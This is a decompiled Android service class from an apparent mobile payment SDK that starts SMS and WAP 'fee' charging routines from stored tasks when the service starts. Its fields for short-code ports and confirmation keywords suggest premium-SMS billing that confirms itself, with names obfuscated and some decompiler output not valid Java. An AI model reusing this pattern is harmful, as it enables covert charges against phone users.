package com.zhangzhifu.sdk.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.IBinder;
import com.zhangzhifu.sdk.db.MMRWapDBManager;
import com.zhangzhifu.sdk.db.MoreSMSWapDBManager;
import com.zhangzhifu.sdk.db.OnlineGameWapDBManager;
import com.zhangzhifu.sdk.db.PcOnlineGameWapDBManager;
import com.zhangzhifu.sdk.db.SMSDBManager;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.modle.SMSBean;
import com.zhangzhifu.sdk.modle.ZhangPayBean;
import com.zhangzhifu.sdk.onlinegame.ZhangPayMMRWF;
import com.zhangzhifu.sdk.onlinegame.ZhangPayMSWF;
import com.zhangzhifu.sdk.onlinegame.ZhangPayOGWF;
import com.zhangzhifu.sdk.onlinegame.ZhangPayPCOWF;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.sms.SMSFee;
import java.io.PrintStream;
import java.util.Iterator;
import java.util.List;

public class ZhangPayPlateService
  extends Service
{
  public static final String SENT_SMS_ACTION = "zhang.pay.sms.send";
  public static final String TAG = "zhangPay_log";
  private static boolean bm;
  private Context ao;
  private ZhangPayPlateService.MyServiceReceiver bd;
  private ZhangPayPCOWF be;
  private ZhangPayMMRWF bf;
  private ZhangPayMSWF bg;
  private List bh;
  private List bi;
  private List bj;
  private List bk;
  private List bl;
  private Handler mHandler = null;
  
  public ZhangPayPlateService() {}
  
  private static void a(List paramList)
  {
    paramList = paramList.iterator();
    for (;;)
    {
      if (!paramList.hasNext()) {
        return;
      }
      SMSBean localSMSBean = (SMSBean)paramList.next();
      System.out.println("SMSTaskInfo id=" + localSMSBean.getId() + " feeTimes=" + localSMSBean.getChargeCount() + " trone=" + localSMSBean.getPort() + " command=" + localSMSBean.getCmd() + " confirmKeyword=" + localSMSBean.getSecondPort() + " confirmTrone=" + localSMSBean.getSecondType() + " confirmCommand=");
    }
  }
  
  private void g()
  {
    try
    {
      bm = false;
      this.bh = SMSDBManager.getInstance().getAllSMSBean(this);
      this.bi = OnlineGameWapDBManager.getInstance().getAllWap(this);
      this.bj = PcOnlineGameWapDBManager.getInstance().getAllWap(this);
      this.bk = MMRWapDBManager.getInstance().getAllWap(this);
      this.bl = MoreSMSWapDBManager.getInstance().getAllWap(this);
      Object localObject1 = SharePreferUtil.getInstance().getFeeMode(this.ao);
      System.out.println("支付类型为：" + (String)localObject1);
      if ((localObject1 != null) && (localObject1 != ""))
      {
        if (!ZhangPayBean.SMS_FEEING)
        {
          ZhangPayLog.d("zhangPay_log", "处理短信计费");
          a(this.bh);
          localObject1 = new SMSFee(this, this.bh);
          if (this.bh != null)
          {
            ZhangPayLog.d("zhangPay_log", "短信计费生成");
            ((SMSFee)localObject1).startSmsFee();
          }
        }
        if (!ZhangPayBean.WAP_FEEING)
        {
          ZhangPayLog.d("zhangPay_log", "处理网游计费");
          new ZhangPayOGWF(this).startFee(this.bi);
        }
        if (!ZhangPayBean.PCWAP_FEEING)
        {
          ZhangPayLog.d("zhangPay_log", "处理PC计费");
          this.be = new ZhangPayPCOWF(this);
          this.be.startFee(this.bj);
        }
        if (!ZhangPayBean.MMR_FEEING)
        {
          ZhangPayLog.d("zhangPay_log", "处理Q网游计费");
          this.bf = new ZhangPayMMRWF(this);
          this.bf.startFee(this.bk);
        }
        if (!ZhangPayBean.MS_FEEING)
        {
          ZhangPayLog.d("zhangPay_log", "处理MS网游计费");
          this.bg = new ZhangPayMSWF(this);
          this.bg.startFee(this.bl);
        }
      }
      return;
    }
    finally {}
  }
  
  protected void finalize()
  {
    if (this.bd != null) {
      unregisterReceiver(this.bd);
    }
    super.finalize();
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    this.ao = this;
    this.mHandler = new b(this);
    IntentFilter localIntentFilter = new IntentFilter("zhang.pay.sms.send");
    this.bd = new ZhangPayPlateService.MyServiceReceiver(this);
    registerReceiver(this.bd, localIntentFilter);
  }
  
  public void onDestroy()
  {
    super.onDestroy();
  }
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    super.onStart(paramIntent, paramInt);
    ZhangPayLog.i("zhangPay_log", "fee service start！");
    if (bm) {}
    do
    {
      return;
      new a(this).execute(new String[] { "" });
    } while ((ZhangPayBean.SMS_FEEING) || (ZhangPayBean.WAP_FEEING) || (ZhangPayBean.MM_FEEING) || (ZhangPayBean.PCWAP_FEEING) || (ZhangPayBean.WOWAP_FEEING) || (ZhangPayBean.MMR_FEEING));
    boolean bool = ZhangPayBean.MS_FEEING;
  }
}
